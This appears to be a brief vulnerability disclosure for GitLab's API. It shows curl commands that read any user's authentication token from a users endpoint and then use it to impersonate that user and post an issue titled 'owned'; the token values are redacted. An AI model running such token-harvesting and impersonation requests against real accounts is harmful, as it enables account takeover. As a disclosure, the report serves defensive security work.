Summary:

Using the api, one can obtain the authentication token for any user on gitlab:
```
$ curl -s --request GET https://gitlab.com/api/v4/users/951422 | jq '.authentication_token'
"[redacted]"
```

We can then use this token to impersonate any user to perform any action they can perform:
```$ curl --request POST --header "PRIVATE-TOKEN: [redacted]" https://gitlab.com/api/v4/projects/3831210/issues?title=owned```

```
